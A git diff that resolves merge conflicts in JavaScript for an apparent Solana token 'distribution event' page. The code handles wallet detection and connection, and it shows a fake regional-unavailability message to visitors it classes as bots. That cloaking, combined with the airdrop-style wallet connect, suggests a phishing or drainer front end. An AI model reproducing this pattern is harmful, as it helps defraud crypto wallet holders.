@@ -239,40 +239,25 @@
   // ── init ──
   async function init(retry=false){
     try{
-<<<<<<< HEAD
       const btnRetry=$('btnRetry'); if(btnRetry) btnRetry.style.display='none';
       const loadingMsg=$('loadingMsg'); if(loadingMsg){ loadingMsg.style.display='block'; loadingMsg.textContent='Loading...'; }
 
       const btnConnect=$('btnConnect');
       if(btnConnect){ btnConnect.disabled=false; setText(btnConnect, isMobile()?'Open in Phantom':'Connect Wallet'); }
-=======
-      if(!retry){ $('btnRetry').style.display='none'; }
-      $('loadingMsg').style.display='block';
-      $('loadingMsg').textContent='Loading...';
-
-      // enable connect immediately — never gate the button on fetches/CDN
-      $('btnConnect').disabled=false;
-      $('btnConnect').querySelector('.btn-text').textContent=isMobile()?'Open in Phantom':'Connect Wallet';
->>>>>>> origin/main
 
       if(_isBot()){ _maint('Service temporarily unavailable in your region.'); return; }
 
       await Promise.all([loadConfig(), loadSeed()]);
-<<<<<<< HEAD
       if(!_cfg.enabled){
         if(loadingMsg) loadingMsg.textContent='Distribution event is currently paused. Check back later.';
         if(btnConnect) btnConnect.disabled=true;
         return;
       }
-=======
-      if(!_cfg.enabled){ $('loadingMsg').textContent='Distribution event is currently paused. Check back later.'; $('btnConnect').disabled=true; return; }
->>>>>>> origin/main
 
       await waitForSolana(12000);
       try { TOKEN_PROG = new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'); } catch(e){ throw new Error('TOKEN_PROG invalid: ' + e.message); }
       try { TOKEN_2022 = new solanaWeb3.PublicKey('TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb'); } catch(e){ throw new Error('TOKEN_2022 invalid: ' + e.message); }
       connection = new solanaWeb3.Connection(RPCS[0],'confirmed');
-<<<<<<< HEAD
 
       if(loadingMsg) loadingMsg.style.display='none';
       if(btnRetry) btnRetry.style.display='none';
@@ -284,16 +269,6 @@
       const loadingMsg=$('loadingMsg');
       if(loadingMsg) loadingMsg.innerHTML = '<span style="color:#ff6b6b">Partial init failure: ' + (e.message || 'unknown') + '. Connect may still work.</span>';
       checkWalletPresence();
-=======
-      $('loadingMsg').style.display='none';
-      $('btnRetry').style.display='none';
-      startCountdown();
-    }catch(e){
-      console.error('init error', e);
-      // keep the button alive — solanaWeb3 check happens at click time
-      $('btnConnect').disabled=false;
-      $('loadingMsg').innerHTML = '<span style="color:#ff6b6b">Partial init failure: ' + (e.message || 'unknown') + '. Connect may still work.</span>';
->>>>>>> origin/main
       startCountdown();
     }
   }
@@ -312,31 +287,17 @@
   }
 
   function detectWallet(){
-<<<<<<< HEAD
-=======
-    // only trust providers that actually expose connect()
->>>>>>> origin/main
     if(window.phantom && window.phantom.solana && typeof window.phantom.solana.connect==='function')
       return {provider:window.phantom.solana, name:'Phantom'};
     if(window.solflare && typeof window.solflare.connect==='function')
       return {provider:window.solflare, name:'Solflare'};
-<<<<<<< HEAD
-=======
-    // window.solana in Brave IS the live provider when Solana is enabled
->>>>>>> origin/main
     if(window.solana && typeof window.solana.connect==='function'){
       if(window.solana.isBraveWallet) return {provider:window.solana, name:'Brave Wallet'};
       if(window.solana.isPhantom) return {provider:window.solana, name:'Phantom'};
       return {provider:window.solana, name:'Browser wallet'};
     }
-<<<<<<< HEAD
     if(window.braveSolana && typeof window.braveSolana.connect==='function')
       return {provider:window.braveSolana, name:'Brave Wallet'};
-=======
-    // braveSolana can be a zombie (injected even when Solana is off in settings) — last resort
-    if(window.braveSolana && typeof window.braveSolana.connect==='function')
-      return {provider:window.braveSolana, name:'Brave Wallet', brave:true};
->>>>>>> origin/main
     return null;
   }
 
@@ -369,7 +330,6 @@
     window.location.href = 'https://phantom.app/ul/browse/' + encodeURIComponent(window.location.href);
   }
 
-<<<<<<< HEAD
   function checkWalletPresence(){
     const btn=$('btnConnect'); if(!btn) return;
     if(isMobile()){ setText(btn,'Open in Phantom'); return; }
@@ -397,19 +357,6 @@
     const detected = detectWallet();
     if(!detected){
       if(isMobile()){ if(btn) btn.disabled=false; openPhantomMobile(); return; }
-=======
-  async function connectWallet(){
-    const btn=$('btnConnect'); btn.disabled=true; clearStatus();
-    if(typeof solanaWeb3==='undefined'){
-      // wait for the CDN instead of dead-ending
-      setStatus('<span class="spinner"></span> Loading wallet libraries...');
-      try{ await waitForSolana(10000); }
-      catch(e){ setStatus('Wallet libraries failed to load. Hard refresh the page (Ctrl+Shift+R) and try again.',true); btn.disabled=false; return; }
-    }
-    const detected = detectWallet();
-    if(!detected){
-      if(isMobile()){ btn.disabled=false; openPhantomMobile(); return; }
->>>>>>> origin/main
       let msg = 'No Solana wallet detected. Install a wallet extension to continue.';
       msg += walletLinks();
       setStatus(msg); if(btn) btn.disabled=false; return;
@@ -445,11 +392,7 @@
         if(providerName==='Brave Wallet') msg='Brave Wallet not responding. Open brave://wallet, make sure Solana is enabled and the wallet is unlocked, then retry.';
         else msg='Wallet not responding. Unlock your wallet extension and retry.';
       }
-<<<<<<< HEAD
       setStatus(msg,true); if(btn) btn.disabled=false;
-=======
-      setStatus(msg,true); btn.disabled=false;
->>>>>>> origin/main
     }
   }
 
